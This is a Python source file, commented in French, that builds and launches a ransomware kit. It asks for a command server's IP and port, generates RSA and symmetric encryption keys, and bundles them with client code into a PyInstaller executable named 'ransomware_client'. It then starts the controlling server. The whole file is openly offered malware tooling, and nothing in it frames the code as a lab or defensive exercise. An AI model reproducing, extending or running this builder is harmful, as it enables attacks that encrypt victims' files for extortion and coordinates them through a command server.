import os
import subprocess
import shutil
import signal
import sys
import time
import configparser
from utils import resource_path
from tqdm import tqdm
from colorama import Fore, Style, init
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Initialiser colorama
init(autoreset=True)

Ascii_Banner="""
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗ █████╗  ██████╗  ██████╗  ██████╗  ██████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔════╝ ██╔═══██╗██╔════╝ ██╔═══██╗
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║███████║██║  ███╗██║   ██║██║  ███╗██║   ██║
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║██╔══██║██║   ██║██║   ██║██║   ██║██║   ██║
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║██║  ██║╚██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝                                                               
"""

def load_config():
    config_path = resource_path('server/config.ini')
    config = configparser.ConfigParser()
    config.read(config_path)
    return config

def save_config(config):
    with open('server/config.ini', 'w') as configfile:
        config.write(configfile)

def generate_rsa_keys():
    print(Fore.CYAN + "Génération des clés RSA...")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    # Créer le dossier 'keys' s'il n'existe pas
    keys_dir = 'keys'
    if not os.path.exists(keys_dir):
        os.makedirs(keys_dir)

    with open(os.path.join(keys_dir, 'private_key.pem'), 'wb') as private_file:
        private_file.write(private_pem)

    with open(os.path.join(keys_dir, 'public_key.pem'), 'wb') as public_file:
        public_file.write(public_pem)

    print(Fore.GREEN + "Clés RSA générées et sauvegardées avec succès.")
    return private_key, public_key

def generate_symmetric_key():
    print(Fore.CYAN + "Génération de la clé symétrique...")
    symmetric_key = os.urandom(32)
    with open(os.path.join('keys', 'symmetric_key.bin'), 'wb') as key_file:
        key_file.write(symmetric_key)
    print(Fore.GREEN + "Clé symétrique générée et sauvegardée avec succès.")
    return symmetric_key

def compile_executable():
    print(Fore.CYAN + "Compilation de l'exécutable...")
    # Supprimer les dossier dist et build s'ils existent déjà
    if os.path.exists('dist'):
        shutil.rmtree('dist')
    if os.path.exists('build'):
        shutil.rmtree('build')

    # Compiler l'exécutable avec PyInstaller
    process = subprocess.Popen([
        'pyinstaller', '--onefile', '--name=ransomware_client',
        '--add-data', 'keys/public_key.pem:keys',
        '--add-data', 'keys/symmetric_key.bin:keys',
        '--add-data', 'server/config.ini:server',
        '--add-data', 'client:client',  # Inclure tout le répertoire client
        '--add-data', 'utils.py:.',
        'client/main.py'
    ], # stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    
    stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

    stdout, stderr = process.communicate()
    if process.returncode != 0:
        print(Fore.RED + "Erreur lors de la compilation :")
        print(stderr.decode())


    # Afficher une barre de progression pour simuler un chargement
    with tqdm(total=100, desc="Compilation en cours", colour="green") as pbar:
        while process.poll() is None:
            time.sleep(0.1)
            pbar.update(1)
        pbar.update(pbar.total - pbar.n)

    # Afficher le chemin de l'exécutable
    executable_path = os.path.join(os.path.dirname(__file__), 'dist', 'ransomware_client.exe')
    print(Fore.GREEN + "Compilation terminée !")
    print(Fore.CYAN + "L'exécutable a été généré à l'emplacement suivant : " + Fore.LIGHTMAGENTA_EX + f"{executable_path}")

def start_server(server_ip, server_port, local_port):
    """ print(Fore.CYAN + "Modification du fichier config.ini du serveur avec l'adresse et le port spécifiés...")
    # Modifier le fichier config.ini du serveur avec l'adresse et le port spécifiés
    with open('server/config.ini', 'w') as config_file:
        config_file.write(f"SERVER_IP = '{server_ip}'\n")
        config_file.write(f"SERVER_PORT = {server_port}\n")
        config_file.write(f"SERVER_PORT = {server_port}\n") """

    # Lancer le serveur
    print(Fore.CYAN + f"Lancement du serveur sur le port local {local_port}...")
    server_process = subprocess.Popen(['python', 'server/app.py', '--port', str(local_port)])

    def signal_handler(sig, frame):
        print(Fore.YELLOW + 'Arrêt du serveur...')
        server_process.terminate()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    server_process.wait()

def main():
    # Afficher la bannière ASCII
    print(Fore.LIGHTMAGENTA_EX + Ascii_Banner)

    # Charger la configuration
    config = load_config()

    # Demander à l'utilisateur l'adresse IP et le numéro de port du serveur pour la connexion client
    server_ip = input(Fore.CYAN + f"Veuillez entrer l'adresse IP du serveur pour la connexion client [{config['SERVER']['client_ip']}] : ") or config['SERVER']['client_ip']
    server_port = input(Fore.CYAN + f"Veuillez entrer le numéro de port du serveur pour la connexion client [{config['SERVER']['client_port']}] : ") or config['SERVER']['client_port']

    # Demander à l'utilisateur le port local pour le serveur
    local_port = input(Fore.CYAN + f"Veuillez entrer le numéro de port local pour le serveur [{config['SERVER']['local_port']}] : ") or config['SERVER']['local_port']

    # Mettre à jour la configuration avec les nouvelles valeurs
    config['SERVER']['client_ip'] = server_ip
    config['SERVER']['client_port'] = server_port
    config['SERVER']['local_port'] = local_port
    save_config(config)

    # Générer les clés
    generate_rsa_keys()
    generate_symmetric_key()

    # Compiler l'exécutable
    compile_executable()

    # Lancer le serveur
    start_server(server_ip, server_port, local_port)

if __name__ == "__main__":
    main()
